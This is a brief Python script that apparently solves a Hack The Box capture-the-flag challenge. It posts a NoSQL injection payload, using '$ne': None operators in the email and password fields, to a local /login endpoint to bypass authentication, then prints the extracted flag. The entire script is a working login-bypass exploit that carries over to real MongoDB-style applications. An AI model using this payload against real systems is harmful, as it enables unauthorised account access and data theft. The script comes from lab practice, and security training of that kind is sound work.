#!/usr/bin/env python3

import requests

HOST, PORT = "0.0.0.0", 1337
CHALLENGE_URL = f"http://{HOST}:{PORT}"

def main():
    json_data = {
        "email": {
            "$ne": None
        }, 
        "password": {
            "$ne": None
        } 
    }

    resp = requests.post(f"{CHALLENGE_URL}/login", json=json_data)

    print("HTB{" + resp.text.split("HTB{")[1].split("}")[0] + "}")


if __name__ == "__main__":
    main()
